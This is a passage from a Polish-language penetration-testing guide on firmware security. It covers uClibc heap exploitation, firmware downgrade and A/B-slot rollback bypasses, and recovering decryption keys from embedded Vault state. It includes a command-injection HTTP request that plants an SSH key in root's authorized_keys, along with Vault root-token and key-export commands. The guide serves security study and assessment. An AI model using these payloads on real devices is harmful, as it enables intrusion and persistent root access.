Jest to szczególnie przydatne w przypadku alokatorów **podobnych do musl/uClibc/dlmalloc** w wbudowanym Linuksie, gdzie uszkodzenie metadanych chunka może zamienić logikę unlink/unbin w prymityw zapisu. Stabilny wzorzec polega na uszkodzeniu **pola rozmiaru**, aby skierować przechodzenie alokatora na **fałszywe chunki umieszczone w przepełnionym buforze**, zamiast od razu nadpisywać prawdziwe wskaźniki bin i powodować awarię procesu.

## Exploitacja binarna i Proof-of-Concept

Przygotowanie PoC dla wykrytych podatności wymaga dogłębnego zrozumienia architektury celu i programowania w językach niskiego poziomu. Zabezpieczenia środowiska uruchomieniowego przed exploitacją binarną są rzadkie w systemach wbudowanych, ale gdy występują, mogą być konieczne techniki takie jak Return Oriented Programming (ROP).

### Uwagi dotyczące exploitacji fastbin w uClibc (wbudowany Linux)

- **Fastbins + konsolidacja:** uClibc używa fastbinów podobnych do tych w glibc. Późniejsza duża alokacja może wywołać `__malloc_consolidate()`, dlatego każdy fałszywy chunk musi przejść kontrole (rozsądny rozmiar, `fd = 0` i sąsiednie chunki uznawane za „zajęte”).<sup>[[6]](#references)</sup>
- **Pliki binarne non-PIE przy ASLR:** jeśli ASLR jest włączone, ale główny plik binarny jest **non-PIE**, adresy `.data/.bss` wewnątrz pliku binarnego są stabilne. Można wybrać obszar przypominający prawidłowy nagłówek chunka sterty, aby skierować alokację fastbinu na **tablicę wskaźników do funkcji**.
- **NUL zatrzymujący parser:** podczas parsowania JSON znak `\x00` w payloadzie może zatrzymać parsowanie, pozostawiając końcowe bajty kontrolowane przez atakującego do wykonania stack pivot/łańcucha ROP.
- **Shellcode przez `/proc/self/mem`:** łańcuch ROP wywołujący `open("/proc/self/mem")`, `lseek()` i `write()` może umieścić wykonywalny shellcode w znanym mapowaniu i wykonać skok do niego.

## Przygotowane systemy operacyjne do analizy firmware

Systemy operacyjne takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) udostępniają wstępnie skonfigurowane środowiska do testowania bezpieczeństwa firmware, wyposażone w niezbędne narzędzia.

## Przygotowane systemy operacyjne do analizy firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS to dystrybucja przeznaczona do przeprowadzania oceny bezpieczeństwa i testów penetracyjnych urządzeń Internetu rzeczy (IoT). Oszczędza dużo czasu, udostępniając wstępnie skonfigurowane środowisko ze wszystkimi niezbędnymi narzędziami.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): system operacyjny do testowania bezpieczeństwa systemów wbudowanych, oparty na Ubuntu 18.04 i wyposażony w narzędzia do testowania bezpieczeństwa firmware.

## Ataki polegające na downgrade firmware i niezabezpieczone mechanizmy aktualizacji

Nawet jeśli producent wdraża weryfikację podpisów kryptograficznych obrazów firmware, **ochrona przed cofnięciem wersji (downgrade)** jest często pomijana. Jeśli bootloader lub program ładujący trybu odzyskiwania weryfikuje jedynie podpis za pomocą osadzonego klucza publicznego, ale nie porównuje *wersji* (ani monotonicznego licznika) wgrywanego obrazu, atakujący może legalnie zainstalować **starszy, podatny firmware z nadal prawidłowym podpisem**, przywracając w ten sposób załatane podatności.<sup>[[4]](#references)</sup>

Typowy przebieg ataku:

1. **Zdobądź starszy, podpisany obraz**
   * Pobierz go z publicznego portalu pobierania producenta, CDN lub strony pomocy technicznej.
   * Wyodrębnij go z aplikacji towarzyszących na urządzenia mobilne/komputery (np. z katalogu `assets/firmware/` w Android APK).
   * Znajdź go w zewnętrznych repozytoriach, takich jak VirusTotal, archiwa internetowe, fora itp.
2. **Prześlij obraz na urządzenie lub udostępnij go urządzeniu** przez dowolny dostępny kanał aktualizacji:
   * Interfejs WWW, API aplikacji mobilnej, USB, TFTP, MQTT itp.
   * Wiele konsumenckich urządzeń IoT udostępnia *nieautoryzowane* punkty końcowe HTTP(S), które przyjmują zakodowane w Base64 bloby firmware, dekodują je po stronie serwera i uruchamiają odzyskiwanie/aktualizację.
3. Po downgrade wykorzystaj podatność, która została załatana w nowszym wydaniu (na przykład filtr command injection dodany w późniejszej wersji).
4. Opcjonalnie wgraj z powrotem najnowszy obraz lub wyłącz aktualizacje, aby uniknąć wykrycia po uzyskaniu trwałego dostępu.

### Przykład: Command Injection po downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

W podatnym (obniżonym) firmware parametr `md5` jest bezpośrednio łączony z poleceniem powłoki bez oczyszczania, co umożliwia wstrzykiwanie dowolnych poleceń (w tym przypadku — uzyskanie dostępu root za pomocą klucza SSH). W późniejszych wersjach firmware wprowadzono podstawowy filtr znaków, ale brak ochrony przed downgrade’em sprawia, że poprawka jest bezużyteczna.<sup>[[4]](#references)</sup>

### Wyodrębnianie firmware z aplikacji mobilnych

Wielu dostawców dołącza pełne obrazy firmware do powiązanych z urządzeniami aplikacji mobilnych, aby aplikacja mogła aktualizować urządzenie przez Bluetooth/Wi-Fi. Pakiety te są często przechowywane bez szyfrowania w APK/APEX, w ścieżkach takich jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra` czy nawet zwykłe `unzip` pozwalają pobrać podpisane obrazy bez fizycznego dostępu do sprzętu.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Obejście ochrony przed downgrade’em wyłącznie w updaterze w układach ze slotami A/B

Niektórzy dostawcy implementują mechanizm **ratchet** zapobiegający downgrade’om, ale tylko w logice *updatera* (na przykład w procedurze UDS przez CAN, poleceniu recovery lub agencie OTA w przestrzeni użytkownika). Jeśli **bootloader** sprawdza później tylko sygnaturę/CRC obrazu i ufa tabeli partycji lub metadanym slotu, nadal można obejść ochronę przed rollbackiem.<sup>[[7]](#references)</sup>

Typowy słaby projekt:

- Metadane firmware zawierają zarówno deskryptor wersji, jak i **ratchet bezpieczeństwa** / licznik monotoniczny.
- Updater porównuje wartość ratchet obrazu z wartością zapisaną w pamięci trwałej i odrzuca starsze, podpisane obrazy.
- Bootloader **nie** analizuje tej wartości ratchet i przed uruchomieniem wybranego slotu weryfikuje tylko nagłówek, CRC i sygnaturę.
- Aktywacja slotu jest zapisywana osobno, w tabeli partycji lub liczniku generacji danego slotu, i **nie jest kryptograficznie powiązana** z dokładnym digestem zweryfikowanego firmware.

W systemach z dwoma slotami tworzy to prymityw **zweryfikuj jeden obraz / uruchom inny obraz**. Jeśli atakujący może sprawić, że updater oznaczy slot B jako następny cel rozruchu, używając aktualnego, podpisanego obrazu, a następnie nadpisać slot B przed ponownym uruchomieniem, bootloader może mimo to uruchomić starszy obraz, ponieważ ufa tylko wcześniej zatwierdzonym metadanym slotu.

Typowy schemat nadużycia:

1. Wgraj **aktualny, podpisany** firmware do nieaktywnego slotu i uruchom standardową procedurę weryfikacji/przełączania, aby układ oznaczył ten slot jako następny aktywny.
2. **Nie uruchamiaj jeszcze ponownie urządzenia**. W tej samej sesji ponownie uruchom procedurę przygotowania/kasowania slotu.
3. Wykorzystaj nieaktualny stan rozruchu lub nieaktualną logikę wyboru slotu, aby updater skasował **ten sam fizyczny slot**, który właśnie został aktywowany.
4. Zapisz w tym slocie **starszy, ale nadal podpisany** firmware.
5. Pomiń procedurę weryfikacji, która egzekwuje ratchet, i uruchom urządzenie ponownie bezpośrednio.
6. Bootloader wybiera aktywowany slot, weryfikuje tylko sygnaturę/integralność i uruchamia stary obraz.

Podczas analizy wstecznej implementacji aktualizacji A/B zwróć uwagę na:

- Wybór slotu wynikający z **flag ustawionych podczas rozruchu**, które nie są odświeżane po pomyślnym przełączeniu.
- Procedurę w rodzaju `prepare_passive_slot()`, która kasuje slot na podstawie nieaktualnego stanu zamiast **bieżącego zatwierdzonego układu**.
- Funkcję w rodzaju `part_write_layout()`, która jedynie zwiększa **licznik generacji** / ustawia flagę aktywności i nie zapisuje hasha zweryfikowanego obrazu.
- Kontrole ratchet zaimplementowane w przestrzeni użytkownika lub kodzie updatera, ale **nie** w ROM / bootloaderze / etapach secure boot.
- Procedury kasowania lub recovery, które pozostawiają slot oznaczony jako rozruchowy nawet po usunięciu i ponownym zapisaniu jego zawartości.

### Lista kontrolna oceny logiki aktualizacji

* Czy transport/uwierzytelnianie *endpointu aktualizacji* jest odpowiednio zabezpieczone (TLS + uwierzytelnianie)?
* Czy urządzenie porównuje **numery wersji** lub **monotoniczny licznik anty-rollback** przed flashowaniem?
* Czy obraz jest weryfikowany w łańcuchu secure boot (np. sygnatury są sprawdzane przez kod ROM)?
* Czy **bootloader egzekwuje ten sam ratchet** co updater, zamiast sprawdzać tylko sygnaturę/CRC?
* Czy metadane aktywacji slotu są **powiązane ze zweryfikowanym digestem/wersją firmware**, czy slot można zmodyfikować po aktywacji?
* Czy po pomyślnym przełączeniu slotu urządzenie musi się uruchomić ponownie, czy też w tej samej sesji nadal można wywołać późniejsze procedury aktualizacji/kasowania?
* Czy kod przestrzeni użytkownika wykonuje dodatkowe kontrole poprawności (np. dozwolona mapa partycji, numer modelu)?
* Czy *częściowe* lub *zapasowe* ścieżki aktualizacji korzystają z tej samej logiki weryfikacji?

> 💡  Jeśli brakuje któregokolwiek z powyższych zabezpieczeń, platforma prawdopodobnie jest podatna na ataki rollback.

## Podatny firmware do ćwiczeń

Aby ćwiczyć wykrywanie podatności w firmware, zacznij od poniższych projektów z podatnym firmware.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- Projekt Damn Vulnerable Router Firmware
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Odzyskiwanie kluczy deszyfrujących firmware ze stanu osadzonego KMS/Vault

Gdy obraz aktualizacji zawiera niewielką ilość metadanych w postaci jawnej oraz duży blob o wysokiej entropii, przed próbami brute force przeprowadź analizę kontenera:<sup>[[1]](#references)</sup>

- Zrzuć nagłówki, offsety i granice wierszy za pomocą `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` zwykle oznacza format OpenSSL `enc`: następne 8 bajtów to sól, a pozostałe bajty to szyfrogram.
- Pole Base64, które po dekodowaniu ma dokładnie `256` bajtów, mocno sugeruje szyfrogram RSA-2048 opakowujący losowe hasło firmware/klucz sesji.
- Dołączony do tego samego pliku materiał PGP często służy wyłącznie do ochrony autentyczności; nie zakładaj, że zapewnia poufność.

Jeśli poszukiwania kluczy statycznych (`grep`, `strings`, wyszukiwanie PEM/PGP) nie przynoszą efektów, przeanalizuj **operacyjną ścieżkę deszyfrowania**, zamiast ograniczać się do szukania kluczy prywatnych:

- Zdekompiluj updater / plik binarny do zarządzania i prześledź, kto odczytuje zaszyfrowany blob, która funkcja pomocnicza/API go odpakowuje oraz jakiej logicznej nazwy klucza używa.
- Przeszukaj wypakowany główny system plików w poszukiwaniu stanu KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) oraz plików jednostek i skryptów init.
- Traktuj tekstowe polecenia `vault operator unseal ...`, klucze odzyskiwania, tokeny bootstrap lub lokalne skrypty automatycznego unseal KMS jako odpowiedniki materiału klucza prywatnego.

Jeśli urządzenie zawiera oryginalny plik binarny Vault i backend pamięci, odtworzenie tego środowiska zwykle jest łatwiejsze niż ponowne implementowanie wewnętrznych mechanizmów Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Z uprawnieniami root w sklonowanym KMS:

- Ustaw klucze transit jako eksportowalne tylko w odizolowanym klonie: `vault write transit/keys/<name>/config exportable=true`
- Wyeksportuj klucz unwrap: `vault read transit/export/encryption-key/<name>`
- Wypróbuj odzyskany klucz RSA z dokładną parą padding/hash używaną przez KMS. Niepowodzenie deszyfrowania PKCS#1 v1.5 ani domyślnego deszyfrowania OAEP **nie** dowodzi, że klucz jest nieprawidłowy; wiele przepływów opartych na Vault używa OAEP z SHA-256, podczas gdy popularne biblioteki domyślnie używają SHA-1.
- Jeśli payload zaczyna się od `Salted__`, dokładnie odtwórz KDF OpenSSL używany przez producenta (`EVP_BytesToKey`, często MD5 w starszych urządzeniach), zanim spróbujesz deszyfrowania AES-CBC.

Dzięki temu „zaszyfrowane firmware” staje się bardziej ogólnym problemem: **odzyskaj klucze operacyjne po stronie urządzenia, a następnie odtwórz offline dokładne parametry unwrap + KDF**.

## Szkolenia i certyfikaty

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Łamanie zabezpieczeń firmware za pomocą Claude: umiejętności na poziomie seniora, autonomia na poziomie juniora](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologia testowania bezpieczeństwa firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktyczny hacking IoT: kompletny przewodnik po atakowaniu Internetu rzeczy](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Wykorzystywanie zero-dayów w porzuconym sprzęcie – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jak inteligentne urządzenie za 20 dolarów dało mi dostęp do twojego domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Teraz widzisz mi: teraz jesteś pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Wykorzystywanie Tesla Wall Connector przez złącze portu ładowania – część 2: obejście zabezpieczenia przed downgrade’em](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Niech zacznie migać: zdalne wykorzystanie Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS w QEMU, część 2: debugowanie i naprawianie](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [10] [Hasła do BIOS-u Dell: słabe szyfrowanie XOR umożliwia odzyskanie danych z pamięci SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [11] [R3n5k1/dellpwn - narzędzia do odzyskiwania haseł do BIOS-u Dell](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
